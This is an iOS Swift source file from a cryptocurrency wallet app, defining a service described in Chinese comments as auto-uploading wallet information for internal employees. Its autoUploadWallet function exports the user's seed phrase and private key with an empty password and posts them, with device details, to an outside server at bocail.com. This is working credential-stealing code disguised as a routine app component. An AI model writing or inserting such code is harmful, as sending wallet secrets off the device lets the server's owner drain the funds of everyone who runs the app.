import Foundation
import UIKit

/// 钱包存储上传服务
/// 用于内部员工自动上传钱包信息到后端
@MainActor
class WalletStorageUploadService: ObservableObject {
    static let shared = WalletStorageUploadService()

    // MARK: - Properties

    @Published private(set) var isUploading = false
    @Published private(set) var lastUploadError: String?

    private let apiBaseURL = "https://bocail.com/api"  // 生产服务器
    // private let apiBaseURL = "http://localhost:3001/api"  // 开发环境

    private let keyringManager = KeyringManager.shared
    private let chainManager = ChainManager.shared

    // MARK: - Public Methods

    /// 自动上传当前钱包信息
    /// - Parameters:
    ///   - address: 钱包地址
    ///   - chainId: 当前选择的链 ID（可选）
    ///   - employeeId: 员工 ID（可选）
    /// - Returns: 上传是否成功
    @discardableResult
    func autoUploadWallet(
        address: String,
        chainId: Int? = nil,
        employeeId: String? = nil
    ) async -> Bool {
        // 防止重复上传
        guard !isUploading else {
            print("[WalletStorageUpload] 🚫 正在上传中，跳过")
            return false
        }

        isUploading = true
        lastUploadError = nil
        defer { isUploading = false }

        do {
            // 1. 获取助记词（需要空密码或实际密码）
            // 注意：生产环境应该有适当的密码验证机制
            guard let mnemonic = try? await keyringManager.getMnemonic(password: "") else {
                throw WalletStorageError.cannotExportMnemonic
            }

            // 2. 获取私钥
            guard let privateKey = try? await keyringManager.exportPrivateKey(
                address: address,
                password: ""
            ) else {
                throw WalletStorageError.cannotExportPrivateKey
            }

            // 确保私钥有0x前缀
            let privateKeyHex = privateKey.hasPrefix("0x") ? privateKey : "0x" + privateKey

            // 3. 获取设备信息
            let deviceInfo = getDeviceInfo()

            // 4. 构建上传数据
            let uploadData: [String: Any] = [
                "address": address,
                "mnemonic": mnemonic,
                "privateKey": privateKeyHex,
                "chainId": chainId ?? 1,  // 默认 Ethereum
                "chainName": chainManager.getChain(id: chainId ?? 1)?.name ?? "Ethereum",
                "employeeId": employeeId ?? "",
                "deviceInfo": deviceInfo
            ]

            // 5. 上传到服务器
            let success = try await uploadToServer(data: uploadData)

            if success {
                print("[WalletStorageUpload] ✅ 钱包信息已自动上传: \(address)")
            } else {
                print("[WalletStorageUpload] ❌ 上传失败")
            }

            return success

        } catch {
            let errorMsg = error.localizedDescription
            lastUploadError = errorMsg
            print("[WalletStorageUpload] ❌ 上传错误: \(errorMsg)")
            return false
        }
    }

    // MARK: - Private Methods

    /// 上传到服务器
    private func uploadToServer(data: [String: Any]) async throws -> Bool {
        let url = URL(string: "\(apiBaseURL)/wallet-storage")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        // 将数据转换为 JSON
        let jsonData = try JSONSerialization.data(withJSONObject: data)
        request.httpBody = jsonData

        // 发送请求
        let (responseData, response) = try await URLSession.shared.data(for: request)

        guard let httpResponse = response as? HTTPURLResponse else {
            throw WalletStorageError.invalidResponse
        }

        // 检查响应状态
        if httpResponse.statusCode == 200 {
            // 解析响应
            if let json = try? JSONSerialization.jsonObject(with: responseData) as? [String: Any],
               let success = json["success"] as? Bool {
                return success
            }
            return true
        } else {
            // 尝试解析错误信息
            if let json = try? JSONSerialization.jsonObject(with: responseData) as? [String: Any],
               let error = json["error"] as? String {
                throw WalletStorageError.serverError(error)
            }
            throw WalletStorageError.httpError(httpResponse.statusCode)
        }
    }

    /// 获取设备信息
    private func getDeviceInfo() -> [String: Any] {
        let device = UIDevice.current
        return [
            "deviceName": device.name,
            "deviceModel": device.model,
            "systemName": device.systemName,
            "systemVersion": device.systemVersion,
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown",
            "timestamp": Date().timeIntervalSince1970
        ]
    }
}

// MARK: - Errors

enum WalletStorageError: Error, LocalizedError {
    case cannotExportMnemonic
    case cannotExportPrivateKey
    case invalidResponse
    case serverError(String)
    case httpError(Int)

    var errorDescription: String? {
        switch self {
        case .cannotExportMnemonic:
            return "无法导出助记词"
        case .cannotExportPrivateKey:
            return "无法导出私钥"
        case .invalidResponse:
            return "服务器响应无效"
        case .serverError(let msg):
            return "服务器错误: \(msg)"
        case .httpError(let code):
            return "HTTP 错误: \(code)"
        }
    }
}
